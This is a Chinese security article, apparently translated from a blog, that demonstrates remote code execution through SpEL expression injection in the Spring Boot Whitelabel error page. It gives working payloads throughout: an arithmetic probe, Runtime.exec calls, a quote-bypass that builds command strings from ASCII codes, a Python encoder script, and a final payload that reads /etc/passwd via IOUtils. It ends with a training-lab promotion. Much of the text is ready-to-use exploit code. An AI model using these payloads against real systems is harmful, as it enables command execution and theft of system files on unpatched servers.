\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/390N710W8DPyyaCUU5-Ohw)

  

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LdRmpz4ibIY8GpicEiabmEOVuDWthuxj2TXBsNCVHu70z5pcUkEHkWCrichUzI2esFfCrwUOpkB24XedQ/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1)

亲爱的,关注我吧

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LdRmpz4ibIY8GpicEiabmEOVuDWthuxj2TXBsNCVHu70z5pcUkEHkWCrichUzI2esFfCrwUOpkB24XedQ/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1)

**10/22**

文章共计1487个词

预计阅读10分钟

来和我一起阅读吧

**该漏洞仅影响 Spring Boot 1.2.8之前版本，Spring Boot 1.2.8版本之后已得到修补。**

在spring中任何反映用户输入的Whitelabel错误页面都将会容易受到攻击。这是因为用户的输入被视做为Springs Expression Language（**SpEL**）。在一次测试中，我遇到了一个特殊的URL，该URL触发了spring中的Whitelabel Error页面表达式注入。

```
https://<domain>/BankDetailForm?id=abc${12*12}abc
```

  

执行结果：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lczz9ALLhwoTxbeOfL1OZYXvaicfG8icdafC77G2qXLDc84DiahgFEZIqpozXk4RnAKaAxLRe1x4M6GQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

spring中的Whitelabel页面将输入的`abc${12*12}abc`显示为`abc144abc`。随后尝试执行一个**id**命令并显示结果。尝试了以下测试：

```
`https://<domain>/BankDetailForm?id=${T(java.lang.Runtime).getRuntime().exec('id')}``payload：${T(java.lang.Runtime).getRuntime().exec('id')}`
```

执行结果：  

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

输入的表达式原样输出，对比David的文章(https://secalert.net/#cve-2016-4977)，一切都显示正确，但是我仍然没有得到想要的输出。尝试了良久之后，我决定本地搭建一个Springs应用程序尝试创建相同的场景。我尝试了基本操作，`{5*5}`并在错误页回显出`25`的结果。然后尝试执行**id**命令，依旧没有执行。通过调试跟踪代码的堆栈信息如下：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

可以清楚的看到包含id命令的单引号被URL编码。得出原因之后，大致的解决方式有两种：

1、通过在错误的代码中查找字符，然后使用substring()将字符串一个个截取来传递给exec()方法。

2、通过找到一种无需使用双引号或单引号就可以传递要执行的字符串的方法。

这里我们采用第二种方法。如果我能够找到可以输入`id`参数的方法，那么`cat /etc/passwd`也将会迎刃而解。在Java中支持嵌套函数的使用。

经过对一些Java类调试之后发现了以下内容：

```
`java.lang.Character.toString(105)` `-> prints the characer 'i'`
```

  
i字符我们已经得到，那么接下来我们通过同样的方法合并字符“ d”即可，我们使用concat()方法来进行嵌套d字符，并与i字符合并。  

```
`java.lang.Character.toString(105).concat(T(java.lang.Character).toString(100))``-> prints the characters 'id'`
```

  
最终得到的有效载荷如下：

```
`https://<domain>/BankDetailForm?id=${T(java.lang.Runtime).getRuntime().exec(T(java.``lang.Character).toString(105).concat(T(java.lang.Character).toString(100)))}`
```

  
执行结果如下所示：

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

通过**getRuntime()**方法执行我们传入的参数，现在，我们已经有了一个回显型的RCE，可以使用它来执行命令。接下来尝试执行`cat /etc/passwd`并将结果打印到Whitelabel Error页面上。这意味着对于每个字符都需要通过ASCII编码来进行传递。每个字符的传入格式如下：

```
concat(T(java.lang.Character).toString(<ascii value>))
```

  
由于字符过多，我们通过python脚本来实现此功能：

```
`#!/usr/bin/env python``from __future__ import print_function``import sys``message = raw_input('Enter message to encode:')``print('Decoded string (in ASCII):\n')``for ch in message:` `print('.concat(T(java.lang.Character).toString(%s))' % ord(ch), end=""),` `print('\n')`
```

  
要获取`cat /etc/passwd`命令的结果，我们通过使用**IOUtils**类调用**toString()**方法将输入流传递给此方法，并获取相应结果。

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

最终payload如下：

```
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

  
  
综上所述，通过Apache IOUtils库，并将`cat /etc/passwd`使用字符类转换为ASCII字符，将转换后的字符传递给**exec()**方法执行。并获得输入流，将其传递给`toString()`IOUtils类的方法解析。

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
翻译来源：http://deadpool.sh/2017/RCE-Springs/
```

### 相关实验（点击阅读原文做实验）  

*   Springboot未授权访问
    
*   https://www.hetianlab.com/expc.do?ec=ECID07d9-3ccd-4c90-8a09-b980d8cd7858&pk\_campaign=weixin-wemedia
    
*   Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息从而导致信息泄露的事件发生
    
      
    

**10/22**

  

欢迎投稿至邮箱：**EDU@antvsion.com**  

有才能的你快来投稿吧！

  

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

戳“阅读原文”我们一起进步